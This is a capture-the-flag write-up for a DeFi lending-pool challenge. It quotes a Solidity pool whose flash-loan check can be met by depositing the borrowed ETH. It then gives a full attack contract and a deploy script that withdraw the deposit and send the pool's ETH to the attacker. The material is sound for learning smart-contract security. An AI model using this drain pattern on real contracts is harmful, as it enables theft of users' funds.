## GOAL
You must take all ETH from the lending pool.

## Examning The Code
This is a very simple one, the contract is allowing to deposit and withdraw at any point at anytime, this the description ;)
we have these 3 functions:
```solidity
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
```

## Exploit 
We can make a flashLoan, in the flashLoan function execute so we can implement execute as function and inside it we can deposit. Then we call the function withdraw and implement receive method to transfer all ether to us.

## Solution
```solidity
contract Attack{
    address payable owner; 
    SideEntranceLenderPool pool;
    constructor(address _pool)
    {
        pool = SideEntranceLenderPool(_pool);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external
    {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }
    receive () external payable{
        owner.transfer(address(this).balance);
    }
}
```

```javascript
const deploying = await ethers.getContractFactory("Attack",attacker);
const attackContract = await deploying.deploy(this.pool.address);
await attackContract.attack(ETHER_IN_POOL);
```
